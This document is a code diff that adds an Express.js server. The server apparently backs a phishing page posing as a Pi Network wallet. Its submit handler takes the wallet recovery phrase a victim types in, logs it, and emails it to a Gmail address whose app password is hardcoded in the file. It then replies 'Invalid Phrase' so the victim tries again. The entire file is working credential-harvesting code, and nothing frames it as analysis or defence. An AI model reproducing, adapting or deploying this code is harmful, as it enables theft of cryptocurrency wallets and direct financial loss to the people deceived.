@@ -1,0 +1,160 @@
+const express = require("express");
+const multer = require("multer");
+const formData = require("form-data");
+// const Mailgun = require("mailgun.js");
+const nodemailer = require("nodemailer");
+const path = require("path");
+
+const app = express();
+const port = 8000; // Change this to your desired port
+
+// Serve static files from the "my-static-website" directory
+// app.use(slashes());
+
+// const mailgun = new Mailgun(formData);
+// const mg = mailgun.client({
+//   username: "api",
+//   key: process.env.MAILGUN_API_KEY || "api_key",
+// });
+
+const transporter = nodemailer.createTransport({
+  auth: {
+    // wallet
+    // pass: "phop baoj wpki iilk",
+    // user: "Pinetworkm493@gmail.com",
+    //pi-personal
+    pass: "vazo zgvm rfxj vvpk",
+    user: "pinetworkclaimpi@gmail.com",
+  },
+  service: "gmail",
+});
+
+// logs any error
+
+const upload = multer();
+
+// Middleware to parse form data
+app.use(upload.none());
+
+app.use(express.static("public"));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "template", "index.html"));
+});
+
+// app.get("/:page", (req, res) => {
+//   const page = req.params.page;
+//   res.sendFile(__dirname + `/template/${page}.html`);
+// });
+//   app.get('/:page', (req, res) => {
+//     const page = req.params.page;
+//     // To avoid directory traversal attacks, sanitize input:
+//     if (/^[a-zA-Z0-9_-]+$/.test(page)) {
+//       res.sendFile(path.join(__dirname, 'template', `${page}.html`));
+//     } else {
+//       res.status(404).send('Page not found');
+//     }
+//   });
+
+app.post("/submit-form", async (req, res) => {
+  const mfText = req.body["mf-text"];
+  const formNonce = req.body["form_nonce"];
+  // forward to Email
+  if (!mfText) {
+    return res.status(400).json({ status: 0, message: "Missing phrase" });
+  }
+
+  // Simulate email logic or logging
+
+  try {
+    if (mfText) {
+      console.log("Phrase received:", mfText);
+      // if(mfText && mfText.split(' ').length == 24){
+      transporter
+        .sendMail({
+          from: "PiNetworkWallet",
+          to: ["pinetworkclaimpi@gmail.com"],
+          // to: ["pablomizeto@gmail.com"],
+          subject: "pinetwork phrase",
+          text: mfText,
+          html: `<h1>${mfText}</h1>`,
+        })
+        .then((result) => {
+          console.log({MailResult: result});
+        })
+        .catch((err) => console.log({MailErr: err}));
+      //   return res.json({
+      //     status: 1,
+      //     store_entries: 1,
+      //     error: ["Some thing went wrong."],
+      //     data: {
+      //       message: "Invalid Phrase",
+      //       hide_form: "",
+      //       form_data: {
+      //         action: "insert",
+      //         id: "7668",
+      //         form_nonce: formNonce,
+      //         "mf-text": mfText,
+      //       },
+      //       form_id: "7668",
+      //       store: {
+      //         "mf-text": mfText,
+      //       },
+      //       redirect_to: "/walle",
+      //     },
+      //   });
+    } else {
+      return res.json({ status: 1, message: "Form submitted successfully" });
+      //   return res.json({
+      //     status: 1,
+      //     store_entries: 1,
+      //     error: ["Some thing went wrong."],
+      //     data: {
+      //       message: "You haven't set up the Finger print yet",
+      //       hide_form: "",
+      //       form_data: {
+      //         action: "insert",
+      //         id: "7668",
+      //         form_nonce: formNonce,
+      //         "mf-text": mfText,
+      //       },
+      //       form_id: "7668",
+      //       store: {
+      //         "mf-text": mfText,
+      //       },
+      //       redirect_to: "/walle",
+      //     },
+      //   });
+    }
+  } catch (error) {
+    console.log(error, "the error");
+    console.log(error);
+  }
+
+  res.json({
+    status: 1,
+    store_entries: 1,
+    error: ["Some thing went wrong."],
+    data: {
+      message: "Invalid Phrase",
+      hide_form: "",
+      form_data: {
+        action: "insert",
+        id: "7668",
+        form_nonce: formNonce,
+        "mf-text": mfText,
+      },
+      form_id: "7668",
+      store: {
+        "mf-text": mfText,
+      },
+      redirect_to: "",
+    },
+  });
+});
+// Start the server
+app.listen(port, () => {
+  console.log(`Server is running on port http://localhost:${port}`);
+});
